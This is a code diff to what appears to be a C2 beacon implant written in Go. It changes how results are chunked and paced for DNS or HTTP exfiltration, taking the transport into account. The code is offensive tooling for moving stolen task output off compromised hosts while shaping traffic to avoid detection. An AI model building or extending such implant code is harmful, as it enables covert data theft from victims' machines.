@@ -468,9 +468,15 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	// Chunk sizing is transport-dependent. On DNS the ceiling comes from label
 	// and FQDN budgets; on HTTP it comes from the operator's configured payload
-	// and the listener's body limit. Same knobs, same build request, different
-	// physics.
-	safeRawChunk := b.client.config.ResultChunkSize()
+	// and the listener's body limit. A dual beacon sends results over HTTP, so
+	// it uses the HTTP budget unless it latched to DNS.
+	effective := "dns"
+	if b.transport != nil {
+		if m := b.transport.Mode(); m == transportHTTP || (m == transportDual && len(b.transport.transports) > 0) {
+			effective = "http"
+		}
+	}
+	safeRawChunk := b.client.config.ResultChunkSizeFor(effective)
 
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
 	if totalChunks == 0 {
@@ -501,7 +507,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	// Pacing follows the transport too: the HTTP values replace the DNS rhythm
 	// when the operator set them, because a 64 KiB chunk and an 80 byte chunk do
 	// not want the same burst pattern.
-	chunksPerBurst, burstPause := b.client.config.ResultBurst()
+	chunksPerBurst, burstPause := b.client.config.ResultBurstFor(effective)
 
 	if jitterMin <= 0 {
 		jitterMin = 1000
